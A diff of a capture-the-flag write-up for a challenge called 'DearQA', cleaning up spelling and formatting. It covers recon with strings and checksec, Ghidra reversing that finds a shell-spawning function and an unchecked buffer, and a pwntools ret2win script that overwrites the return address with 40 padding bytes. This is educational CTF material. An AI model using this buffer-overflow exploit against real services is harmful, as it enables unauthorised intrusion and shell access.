@@ -1,45 +1,74 @@
 # DearQA
 
-## Gather Infomation (OSINIT)
-first we what to gather infomation as much as possible from this binary 
+## Gather Information (OSINT)
 
-1. First clue the binary is not stripped and it an x86_64 ELF binary 
+First, we want to gather as much information as possible from this binary.
+
+1. **First clue:** the binary is not stripped, and it is an x86_64 ELF binary.
+
 ![alt text](image/file.png)
-2. Second clue string give us some clue about this program at some point we might able to entract with shell as we saw /bin/bash and it want us to input a some kind of password
+
+2. **Second clue:** running `strings` gives us some clues about this program. At some point, we might be able to interact with a shell, since we can see `/bin/bash`, and it also looks like the program wants us to input some kind of password.
+
 ![alt text](image/string.png)
-3. Third clue tell us that binary have ALSR disable and Canary also disable which mean the address doesen't changes this mean we can write a value into and do some evil stuff >:) 
+
+3. **Third clue:** `checksec` tells us that ASLR is disabled and the stack canary is also disabled. This means the addresses should stay predictable, and without a canary protecting the stack, we might be able to overwrite some values and do some evil stuff >:)
+
 ![alt text](image/checksec.png)
 
-## Program Controll flow (Reverse Engineering)
-after you open a open a ghidra or ida you will some odd fucntion in main it look normal but look eye emoji the there a function that call for shell exe ? what that crazy 
-but buffer also don't have a lenght check ether let exploite this >:)
+## Program Control Flow (Reverse Engineering)
+
+After you open the binary in Ghidra or IDA, you will see some interesting functions.
+
+At first, `main` looks pretty normal, but look closely 👀. There is a function that appears to execute a shell. What is that doing there? Crazy.
+
+The buffer also doesn't have a proper length check, so let's exploit this >:)
+
 ![alt text](image/ghidra1.png)
+
 ![alt text](image/ghidra2.png)
 
-## Crafting exploite  
-run objdump -d binary will give us a function address we need to hyjack you can do this yourself in gdb but i want you guy to do it yourself if you want to explore do it and you will learn alot more 
+## Crafting the Exploit
 
-anyway we connect to the server with this code 
+Running:
+
+```bash
+objdump -d binary
 ```
+
+will give us the address of the function we want to hijack.
+
+You can also find the address yourself using GDB. I want you guys to explore that part yourselves because you will learn a lot more by doing it.
+
+Anyway, we can connect to the challenge server with this code:
+
+```python
 from pwn import *
 
-# enter the right infomation from your room or challenge
+# Enter the correct information from your room or challenge
 HOST = 'hostname'
-PORT = 80085  
+PORT = 80085
 
-# connect to the sever
+# Connect to the server
 r = remote(HOST, PORT)
 
-# craft an evail payload
+# Craft an evil payload
 target = 0xtarget
+
 payload = b'A' * 40
 payload += p64(target)
 
-# now send it >:)
+# Now send it >:)
 r.sendlineafter(b': ', payload)
 r.interactive()
-
-
 ```
-## Congrate you a hacker :3
 
+The `40` bytes of `A`s fill the buffer and reach the saved return address.
+
+After that, `p64(target)` overwrites the return address with the address of the function we want to execute.
+
+When the vulnerable function returns, instead of continuing normally, execution jumps to our target function.
+
+If everything works correctly...
+
+## Congrats, you're a hacker :3
